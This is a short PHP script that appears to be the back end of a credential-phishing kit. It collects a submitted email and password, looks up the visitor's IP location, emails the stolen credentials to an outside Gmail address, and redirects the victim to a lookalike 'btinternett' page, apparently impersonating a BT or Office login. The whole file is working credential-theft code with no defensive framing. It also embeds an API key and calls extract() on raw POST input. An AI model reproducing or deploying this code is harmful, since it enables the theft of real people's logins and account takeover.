<?php

extract($_POST);

$ip = getenv("REMOTE_ADDR");
//Get IP Country City
$url = "http://api.ipinfodb.com/v3/ip-country/?key=d5fffa06f621e0c28602b13de0c551db8aa491f01e694648988453bc9bcf72e1&ip=$ip";
$url = "http://api.ipinfodb.com/v3/ip-city/?key=d5fffa06f621e0c28602b13de0c551db8aa491f01e694648988453bc9bcf72e1&ip=$ip";
$ipCountryCityInfo = file_get_contents($url);
//
$Email = $_POST['liquid'];
$Passwd = $_POST['snake'];

$message .= "Username: ".$liquid."\n";
$message .= "PassWord: ".$snake."\n";
$message .= "Country: ".$ip."\n";

$from .= "MIME-Version: 1.0\r\n";
$subj .= "$ip.0ffice.$Email.";

if (empty($liquid) || empty($snake)) {
header( "Location: https://btinternett.myportfolio.com" );
}
else {
mail("fidelityinternationalinc2016@gmail.com", $subj, $message, $from);
header("Location: https://btinternett.myportfolio.com");
}
?>
